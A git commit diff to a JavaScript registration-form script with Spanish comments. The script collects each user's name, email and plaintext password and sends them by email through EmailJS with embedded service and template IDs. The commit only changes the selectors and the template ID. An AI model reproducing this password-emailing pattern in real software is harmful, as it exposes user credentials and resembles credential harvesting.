4cfa746f81d84c9a8d2e81cf99e9b8d73e6edb03
karentre100 <karentre100@gmail.com>
2025-04-25 17:00:43 -0600

    Update script.js

--- script.js
+++ script.js
@@ -1,19 +1,19 @@
-emailjs.init('ReqtkWfjI392LAzFb'); // Tu User ID
+emailjs.init('ReqtkWfjI392LAzFb'); // Tu User ID de EmailJS
 
 document.getElementById('formRegistro').addEventListener('submit', (e) => {
     e.preventDefault();
     
     const datos = {
-        nombre: document.querySelector('input[type="text"]').value,
-        correo: document.querySelector('input[type="email"]').value,
-        contrasena: document.querySelector('input[type="password"]').value
+        nombre: document.getElementById('nombre').value,
+        correo: document.getElementById('correo').value,
+        contrasena: document.getElementById('password').value
     };
 
-    emailjs.send("service_syrc1uk", "template_otuzmqu", datos)
+    emailjs.send("service_syrc1uk", "template_u3etoro", datos)
         .then(() => {
             window.location.href = 'success.html';
         })
         .catch((error) => {
-            alert('Error: ' + error.text);
+            alert('Error al enviar: ' + error.text);
         });
 });
